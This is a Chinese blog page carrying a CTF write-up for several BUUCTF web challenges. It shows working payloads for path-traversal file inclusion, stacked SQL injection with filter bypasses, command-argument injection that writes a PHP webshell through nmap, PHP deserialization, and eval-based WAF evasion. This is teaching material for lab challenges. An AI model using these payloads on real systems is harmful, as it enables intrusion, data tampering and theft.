<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
<script>
    (function(){
        if('{{ page.password }}'){
            if (prompt('请输入文章密码') !== '{{ page.password }}'){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>
  
  <title itemprop="name">BUUCTF-WP | Cupid&#39;s Blog</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "Cupid'sblog";
  mashiro_option.author_name = "blog";
  mashiro_option.site_url = "https://bephplover.github.io/";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(1).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(2).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(3).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(4).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(5).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(6).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(7).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(8).jpg.webp".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
</head>
</html>
<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop filter-dot">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://bephplover.github.io/">
          <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/custom/namei.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>Welcome to my blog,have a good time!</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="https://github.com/bephplover" target="_blank" class="social-github" title="github">
                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/github.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="http://weibo.com/mashirozx?is_all=1" target="_blank" class="social-github" title="sina">
                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/sina.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://music.163.com/#/user/home?id=623980935" target="_blank" class="social-github" title="wangyiyun">
                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/wangyiyun.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="http://weibo.com/mashirozx?is_all=1" target="_blank" class="social-github" title="zhihu">
                    <img src="https://cdn.jsdelivr.net/gh/bephplover/cdn@2.7/img/social/zhihu.png">
                  </a>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono">Cupid&#39;s</span>
            <span class="shironeko">blog</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/技术/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          技术
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/内网渗透/">
                          <i class="fa fa-file-text-o" aria-hidden="true"></i>
                          内网渗透
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/编程类/">
                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
                          编程学习
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/Linux/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          Linux学习
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/CTF/">
                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
                          CTF
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/Web漏洞/">
                          <i class="fa fa-book" aria-hidden="true"></i>
                          Web渗透
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="javascript:;">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
                    清单
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/tags/悦读/">
                          <i class="fa fa-th-list faa-bounce" aria-hidden="true"></i>
                          书单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/music/">
                          <i class="fa fa-headphones" aria-hidden="true"></i>
                          歌单
                        </a>
                      </li>
                    
                      <li>
                        <a href="/tags/图集/">
                          <i class="fa fa-photo" aria-hidden="true"></i>
                          图集
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我？
                        </a>
                      </li>
                    
                      <li>
                        <a href="/theme-sakura/">
                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
                          主题
                        </a>
                      </li>
                    
                      <li>
                        <a href="/lab/">
                          <i class="fa fa-cogs" aria-hidden="true"></i>
                          Lab
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/atom.xml">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-rss faa-pulse" aria-hidden="true"></i>
                    RSS
                  </span>
                </a>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

  <div class="pattern-center single-center">
    <!-- 有配图默认渲染第一张 -->
    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png">
    </div>
    <header class="pattern-header single-header">
      <h1 class="entry-title">
      BUUCTF-WP</h1>
      <p class="entry-census">
        <span>
          <a href="">
            <img src="">
          </a>
        </span>
        <span>
          <a href=""></a>
        </span>
        <span class="bull">
        ·</span>
        2020-5-9<span class="bull">
        ·</span>
      <span id="busuanzi_value_page_pv"></span>次阅读</p>
    </header>
  </div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
        <div class="entry-content">
          <center>目录</center>

<!-- toc -->

<ul>
<li><a href="#web部分">Web部分</a><ul>
<li><a href="#1hctf-2018warmup">1.[HCTF 2018]WarmUp</a></li>
<li><a href="#2随便注入">2.随便注入</a></li>
<li><a href="#3online-tool">3.Online Tool</a></li>
<li><a href="#4zjctf2019nizhuansiwei">4.[ZJCTF2019]NiZhuanSiWei</a></li>
<li><a href="#5easy-calc">5.Easy Calc</a></li>
<li><a href="#6强网杯随便注">6.强网杯（随便注）</a></li>
<li><a href="#7护网杯-2018easy_tornado">7.[护网杯 2018]easy_tornado</a></li>
<li><a href="#8ciscn2019-华北赛区-day1-web2ikun">8.[CISCN2019 华北赛区 Day1 Web2]ikun</a></li>
<li><a href="#9bjdctf2020ezphp">9.[BJDCTF2020]EzPHP</a></li>
<li><a href="#10rctf2015">10.RCTF2015</a></li>
<li><a href="#11de1ctf-2019ssrf-me">11.[De1CTF 2019]SSRF Me</a></li>
<li><a href="#12actf2020-新生赛upload">12.[ACTF2020 新生赛]Upload</a></li>
<li><a href="#13actf2020-新生赛exec">13.[ACTF2020 新生赛]Exec</a></li>
<li><a href="#14actf2020-新生赛backupfile">14.[ACTF2020 新生赛]BackupFile</a></li>
<li><a href="#15gxyctf2019ping-ping-ping">15.[GXYCTF2019]Ping Ping Ping</a></li>
<li><a href="#16hctf-2018admin">16.[HCTF 2018]admin</a></li>
<li><a href="#17buu-code-review-1">17.BUU CODE REVIEW 1</a></li>
<li><a href="#18gyctf2020blacklist">18.[GYCTF2020]Blacklist</a></li>
<li><a href="#19suctfcheckin">19.[SUctf]Checkin</a></li>
<li><a href="#20">20.</a></li>
<li><a href="#21bjdctf2020the-mystery-of-ip">21.[BJDCTF2020]The mystery of ip</a></li>
<li><a href="#22vn2020-公开赛checkin">22.[V&amp;N2020 公开赛]CHECKIN</a></li>
<li><a href="#23网鼎杯-2018fakebook">23.[网鼎杯 2018]Fakebook</a></li>
<li><a href="#24swpu2019web1">24.[SWPU2019]Web1</a></li>
<li><a href="#25pythonnginx">25.pythonnginx</a></li>
<li><a href="#26bjdctf2020easy-md5">26.[BJDCTF2020]Easy MD5</a></li>
<li><a href="#27bjdctf2020mark-loves-cat">27.[BJDCTF2020]Mark loves cat</a></li>
<li><a href="#29ciscn2019-华北赛区-day2-web1hack-world">29.[CISCN2019 华北赛区 Day2 Web1]Hack World</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

<h1><span id="web部分">Web部分</span></h1><h2><span id="1hctf-2018warmup">1.[HCTF 2018]WarmUp</span></h2><p>&emsp;&emsp;进入页面后是一个大大的滑稽，查看源代码，提示了一个source.php，打开发现是php代码审计。代码如下<a id="more"></a>：</p>
<pre><code class="PHP">     &lt;?php
        highlight_file(__FILE__);
        class emmm
        {
            public static function checkFile(&amp;$page)
            {
                $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];
                if (! isset($page) || !is_string($page)) {
                    echo &quot;you can&#39;t see it&quot;;
                    return false;
                }

                if (in_array($page, $whitelist)) {
                    return true;
                }

                $_page = mb_substr(
                    $page,
                    0,
                    mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
                );
                if (in_array($_page, $whitelist)) {
                    return true;
                }

                $_page = urldecode($page);
                $_page = mb_substr(
                    $_page,
                    0,
                    mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
                );
                if (in_array($_page, $whitelist)) {
                    return true;
                }
                echo &quot;you can&#39;t see it&quot;;
                return false;
            }
        }

        if (! empty($_REQUEST[&#39;file&#39;])
            &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
            &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
        ) {
            include $_REQUEST[&#39;file&#39;];
            exit;
        } else {
            echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;
        }  
    ?&gt;</code></pre>
<p>阅读上面代码可知可以request方式传递一个file参数，并且这个file参数需要携带whilelist数组中的hint.php或者是source.php并且用了substr函数进行截取判断也就是如果传入的file中带有？那么？前面的内容必须带有hint.php或者是source.php。到这里先停一下，这个页面是source.php,我们看一下hint.php的内容，有了提示：flag not here, and flag in ffffllllaaaagggg。也就是flag是在ffffllllaaaagggg下面。对于这个应该是个目录，那么这个目录又在哪个目录下呢，这里的源代码中直接把用户可控参数file给include了，也就是文件包含漏洞，那么可以访问到任意目录，构造</p>
<pre><code>payload:?file=hint.php?/../../../../../ffffllllaaaagggg</code></pre><p>最后拿下flag.<br>这里采用/../进行目录穿越，../可以回到上一个目录，正好？截取掉前面的内容满足条件，可以include进来，就去到了flag目录下。</p>
<h2><span id="2随便注入">2.随便注入</span></h2><p>在输入一些关键字后提示：return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);这里在关键词中间添加/**/注释符进行绕过,实测用**就够了</p>
<pre><code class="sql">    un**ion se**lect 1,group_concat(table_name) fr**om information_schema.tables
    whe**re database()=&quot;hahahah&quot;#</code></pre>
<p>和显然，上面这一句过滤规则不管我怎么绕过，都不能产生出这些关键字，也就是完全不能用了。<br>补充一下，读表的语句是1’;show columns from <code>1919810931114514</code>; # 博主用的markdown自动把<code>符号转码了。对以数字为表名的表进行操作时，需要加上</code>“符号</p>
<h2><span id="3online-tool">3.Online Tool</span></h2><pre><code class="php">    &lt;?php

    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
        $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
    }

    if(!isset($_GET[&#39;host&#39;])) {
        highlight_file(__FILE__);
    } else {
        $host = $_GET[&#39;host&#39;];
        $host = escapeshellarg($host);
        $host = escapeshellcmd($host);
        $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
        echo &#39;you are in sandbox &#39;.$sandbox;
        @mkdir($sandbox);
        chdir($sandbox);
        echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);
    }</code></pre>
<p>&emsp;&emsp;进入页面后直接是代码审计，这道题标签是PHP和RCE，也就是要构造RCE，第一个判断条件是设置了XXF的话，就把XXF的值赋给$_SERVER[‘REMOTE_ADDR’]。接下来是没有设置get传递Host的话，就显示出本文代码，下面是设置了get的host话，就进行两次防范与过滤处理，接下来先重点了解一下这两个函数：<br>escapeshellarg以及escapeshellcmd,在这里我们先不用百度，我们在本地测试它究竟做了些什么。测试代码：</p>
<pre><code class="php">    $host = $_GET[&#39;host&#39;];
        echo $host.&quot;&lt;br&gt;&quot;;
        $host = escapeshellarg($host);
        echo $host.&quot;&lt;br&gt;&quot;;
        $host = escapeshellcmd($host);
        echo $host.&quot;&lt;br&gt;&quot;;</code></pre>
<p>&emsp;&emsp;首先在没有输入host的情况下，屏幕输出了””以及^”^”,可以看到arg应当是做了加双引号处理，而cmd又在双引号前面加上了^处理。现在我们输出host=1.同上面没有输入的时候，过滤机制一样，接下来我们在测试语句下面加上system($host);这样我们用phpinfo函数来测试，试图绕过其过滤机制，最后被两次处理的phpinfo()变成了-&gt;^”phpinfo^(^)^”,我们加上’来试试能否闭合”,当我们在phpinfo()后面再加上双引号后，又多了很多^符号，这说明escapeshellcmd命令可以用来处理引号，无论单引号还是双引号都加上^符号来过滤。尝试了很多次发现有问题，我们回到原题，原题的system中是采用的””.$host故这里我们改写system的内容，也这样写，然后再尝试绕过。这里尝试后发现前面引号是单独闭合的，故只输出来看清楚过滤规则，如下所示：</p>
<pre><code class="php">    $host = $_GET[&#39;host&#39;];
        echo $host.&quot;&lt;br&gt;&quot;;
        $host = escapeshellarg($host);
        echo $host.&quot;&lt;br&gt;&quot;;
        $host = escapeshellcmd($host);
        echo $host.&quot;&lt;br&gt;&quot;;
        system($host);
        echo &quot;\&quot;1\&quot;$host&quot;;</code></pre>
<p>&emsp;&emsp;在疑惑为什么转义是^,然后^怎么绕时，最后询问了笑师傅，最后才知道这两个函数在Linux下转义才是\而在windows下是^.我就说。。这让我怎么绕嘛。于是去Centos下试试。<br>在Centos下我发现了一个有趣的东西，那就是\在命令行中几乎不起作用，也就是说这道题我们闭合了’后，其余转义的\根本就不需要管了，我们的RCE依旧在LINUX下可以执行，故构造payload写入一句话木马：</p>
<pre><code class="php">    &#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre>
<p>&emsp;&emsp;这里还利用了nmap的 -oG选项，可以实现将命令和结果写到文件，这样就把一句话木马写到1.php下了，由于mkdir函数我们还知道了文件存放的目录，故接着用菜刀连接我们上传的一句话文件就可以了。<br>注意猜到连接时地址填写格式：http:网站域名/mkdir()产生目录/1.php 这样就可以成功连接上了，然后在根目录下就拿到了flag.</p>
<p>&emsp;&emsp;这里也可以看出上传漏洞是很难利用的，因为最重要的得知道上传后的文件存放路径，这道题是告诉了的，但其他安全的网站肯定会藏到你根本找不到的地方，并且现在最新的技术，可以创造反向服务器，也就是在真正的服务器前给出虚拟服务器，存放的路径也都是虚拟的，因而很难实现上传漏洞。当然这只是理论上的，总有大佬很easy的解决这个过渡问题。</p>
<h2><span id="4zjctf2019nizhuansiwei">4.[ZJCTF2019]NiZhuanSiWei</span></h2><pre><code class="php">     &lt;?php  
    $text = $_GET[&quot;text&quot;];
    $file = $_GET[&quot;file&quot;];
    $password = $_GET[&quot;password&quot;];
    if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;)){
        echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
        if(preg_match(&quot;/flag/&quot;,$file)){
            echo &quot;Not now!&quot;;
            exit(); 
        }else{
            include($file);  //useless.php
            $password = unserialize($password);
            echo $password;
        }
    }
    else{
        highlight_file(__FILE__);
    }
    ?&gt; </code></pre>
<p>进入页面后发现是代码审计题，从file_get_contents函数可以看出text应该为某种协议，传递参数welcome to the zjctf,尝试使用php://input协议，然后post这个参数，接下来是文件包含，提示了useless.php于是可以尝试用filter协议读取这个php文件。然后是会把反序列化之后的password输出出来，这里，有点不懂这个意思，应该是构建什么序列化的对象，这个password猜测会是flag,先试试前两个条件。构造</p>
<pre><code>    ?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre><p>后发现一串base64编码，解码发现以下代码:</p>
<pre><code class="php">    &lt;?php  

    class Flag{  //flag.php  
        public $file;  
        public function __tostring(){  
            if(isset($this-&gt;file)){  
                echo file_get_contents($this-&gt;file); 
                echo &quot;&lt;br&gt;&quot;;
            return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
            }  
        }  
    }  
    ?&gt; </code></pre>
<p>从上可以看出，将其序列化传给password，即可执行魔术方法_tostring()，<br>最后的payload(并且post：welcome to the zjctf)：</p>
<pre><code>    ?text=data://text/?php://input&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} </code></pre><p>在其他人的WP看到了第一个使用data伪协议的text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=然后传输直接在url上通过base64绕过，我采用的是input方式，用post的方式也可以，最后都拿到了flag,然后查看源码，注释中就有flag.</p>
<h2><span id="5easy-calc">5.Easy Calc</span></h2><p>进入页面后是个计算器，输入计算式就可以计算想要的结果，第一反应试试了1+2哈哈结果3，好了直接看源码发现以下提示:</p>
<pre><code class="javascript">&lt;!--I&#39;ve set up WAF to ensure security.--&gt;
    &lt;script&gt;
        $(&#39;#calc&#39;).submit(function(){
            $.ajax({
                url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),
                type:&#39;GET&#39;,
                success:function(data){
                    $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;
                &lt;strong&gt;答案:&lt;/strong&gt;${data}
                &lt;/div&gt;`);
                },
                error:function(){
                    alert(&quot;这啥?算不来!&quot;);
                }
            })
            return false;
        })
    &lt;/script&gt;</code></pre>
<p>第一反应我试了下XSS，但是很明显肯定是这啥算不来，故行不通，上面仔细看有一个calc.php，打开发现以下源代码:</p>
<pre><code class="php">    &lt;?php
    error_reporting(0);
    if(!isset($_GET[&#39;num&#39;])){
        show_source(__FILE__);
    }else{
            $str = $_GET[&#39;num&#39;];
            $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
            foreach ($blacklist as $blackitem) {
                    if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
                            die(&quot;what are you want to do?&quot;);
                    }
            }
            eval(&#39;echo &#39;.$str.&#39;;&#39;);
    }
    ?&gt; </code></pre>
<p>从上面可以看出过滤了一些/之类的，应该是防止直接读取文件，这里看一下怎么利用，eval这一个很关键，可以把str打印出来，也就是用num可以传输出flag.首先要知道flag在哪个文件下，才好读取，试试scandir(‘/‘)这里斜杠用不了，那么里面是不是可以用个函数代表/这里用chr函数，可以把ASCII值转换为对应的字符，chr有个相反的函数，可以先查出/的ascii值。<br>ord()获得字符串的第一个字符的ASCII值<br>chr()将ASCII值转换为其字符<br>chr(47)即为/，所以构造?num=scandir(‘chr(47)’)<br>页面显示forbidden，应该是被墙了，联系之前的注释<!--I've set up WAF to ensure security.--><br>这儿应当过滤了传入的num参数，在查看其他博文时发现一个骚操作，传递参数?%20num即可绕过这个WAF，<br>那么传入?%20num=scandir(‘chr(47)’)<br>结果出现what are you want to do?，可能是这个引号出问题了，去掉重新试试。对了这里是echo出来的，害的加个var_dump,发现f1agg文件，接下来用file_get_contents读取。同样 ?num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))).这里转换的即/f1agg,拿到flag.接下来研究哈为什么传递空格num就可以绕过这个WAF。</p>
<p>这里知道了一个php解析url的规则，如果传入的变量有空格，会去掉前面的空格再解析，通过这个特性即可绕过waf,这个waf只管num它管不着空格num,然而当其解析为php文件时又把num前面的空格去掉，因而又成功的达到代码要求。因而绕过。</p>
<h2><span id="6强网杯随便注">6.强网杯（随便注）</span></h2><p>进入页面后在姿势表单中输入’后报错，说明存在sql注入，在尝试输入union select后，发现主要的查询语句都被过滤掉，这里尝试一下大小写或者双写是否能绕过。仍然爆出这个</p>
<pre><code>    return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>说明无法绕过，至少我现能力无法绕过，尝试其他查询方法，<br>先用order by 知道了字段数目为2，到3就报错了。<br>这里既然过滤了常规查询，尝试堆叠注入，因为堆叠注入无需使用常规查询语句，<br>堆叠注入原理:在sql语句中分号(;)用来表示一条sql语句的结束。因而我们可以假想，在一个sql语句结束后加上;再写一条sql语句，是不是两条语句都会被执行，因而这就成就了堆叠注入，其实它和union的原理很接近。但两者又不相同。union后门的语句类型有限，用来执行查询语句还可以，而堆叠注入的后门构造一句可以书写任何的sql语句。比喻我第一句是查询，堆叠后一句甚至可以删除，而Union两者必须保持一致。<br>当然在看了一些文章后，也了解到堆叠注入的局限性，它可能收到API或者数据库引擎不支持的限制，权限不足也有可能导致一些攻击的失败。在读取数据时候，union是好的，如果可以使用union情况下，尽量使用union查询。</p>
<p>接下来尝试一下这道题构造payload:0’;show databases;#<br>这样查询到数据库为ctftraing以及supersqli.猜测在这两个数据库中，接下来查询表名<br>payload:0’;show tables;#<br>发现words,1919810931114514表<br>接下来查看字段名:<br>payload:0’;show columns from words;#<br>payload:0’;show columns from ‘1919810931114514’;#<br>这里上面数字的查询失败了，网上查询后都说需要使用反引号即(`)<br>Mysql中用一对反引号来标注sql语句中的标识，如数据库名，表名，字段名等<br>引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值<br>例如：</p>
<pre><code class="sql">    slect * from `username` where `name`=&#39;period&#39;</code></pre>
<p>这里查到19198表里面存在flag字段。接下来需要尝试查询字段内容<br>最后使用:</p>
<pre><code class="sql">    payload:1&#39;;use supersqli;set @sql=concat(&#39;s&#39;,&#39;elect `flag` from `1919810931114514`&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;--+</code></pre>
<p>PREPARE:准备一条sql语句，并分配给这条sql语句一个名字供之后调用<br>EXECUTE：执行命令<br>用法:</p>
<pre><code class="sql">    PREPARE stmt_name FROM prparable_stmt
    EXECUTE stmt_name
    {DEALLOCATE | DROP} PREPARE stmt_name
</code></pre>
<p>当然这里这个方法已经是最简单的，还看到其他大佬的骚操作:<br>既然没过滤 alert 和 rename，那就可以把表和列改名。先把 words 改为 words1，再把数字表改为 words，然后把新的 words 表里的 flag 列改为 id ，这样就可以直接查询 flag 了<br>构造 payload 如下</p>
<pre><code class="sql">    /?inject=1&#39;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</code></pre>
<p>在更改了一系列名字后，使用1’ or ‘1’=’1即可获得flag.</p>
